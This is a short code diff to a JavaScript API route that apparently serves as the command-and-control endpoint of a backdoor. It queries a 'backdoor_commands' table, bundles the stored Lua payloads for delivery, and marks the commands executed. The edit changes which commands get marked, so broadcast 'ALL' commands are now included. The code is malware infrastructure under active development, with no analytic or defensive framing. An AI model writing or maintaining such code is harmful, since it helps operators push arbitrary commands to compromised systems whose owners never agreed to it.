@@ -10,7 +10,6 @@ export async function GET(request) {
     const username = searchParams.get('user') || 'Unknown';
     const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0].trim() || request.ip || '127.0.0.1';
 
-    
     const { data: commands, error } = await supabase
       .from('backdoor_commands')
       .select('*')
@@ -25,7 +24,7 @@ export async function GET(request) {
 
     const luaPayloads = commands.map(c => c.payload_lua).join('\n\n');
 
-    const commandIds = commands.filter(c => c.target_type !== 'ALL').map(c => c.id);
+    const commandIds = commands.map(c => c.id);
     if (commandIds.length > 0) {
       await supabase.from('backdoor_commands').update({ status: 'executed' }).in('id', commandIds);
     }
